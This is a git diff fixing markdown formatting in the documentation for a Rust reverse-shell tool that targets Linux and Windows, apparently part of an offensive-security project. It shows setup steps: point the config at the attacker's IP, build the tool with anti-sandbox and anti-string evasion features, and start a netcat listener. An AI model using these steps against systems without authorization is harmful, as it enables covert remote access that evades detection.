@@ -12,7 +12,7 @@ datatable: true
 Target OS | Demo
 --------- | ----
 Linux     | ![gif](/gifs/tcp_reverse_shell.gif)
-Windows   | [![gif](/gifs/tcp_reverse_shell_windows.gif)
+Windows   | ![gif](/gifs/tcp_reverse_shell_windows.gif)
 
 <div class="datatable-end"></div>
 
@@ -26,14 +26,14 @@ The reverse shells for both Linux and Windows work by establishing a [Transmissi
 1.  [Not shown in GIF] Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/rco_config/src/lib.rs) 
 and change the IP address and port to match the IP address of your attacking machine and the port you will use for a listener respectively
 2.  [Not shown in GIF] Compile the executable
-  1.  For Linux targets
-  ```commandline
-  cargo build -p tcp_reverse_shell [antisand][,][antistring]] --release
-  ```
-  2.  For Windows targets
-  ```commandline
-  cargo build --target x86_64-pc-windows-gnu -p tcp_reverse_shell [--features [antisand][,][antistring]] --release
-  ```
+    1.  For Linux targets
+    ```commandline
+    cargo build -p tcp_reverse_shell [antisand][,][antistring]] --release
+    ```
+    2.  For Windows targets
+    ```commandline
+    cargo build --target x86_64-pc-windows-gnu -p tcp_reverse_shell [antisand][,][antistring]] --release
+    ```
 3.  Start a netcat listener on the attacking machine on the same port you configured in step 1
 ```commandline
 nc -nlvp 4444
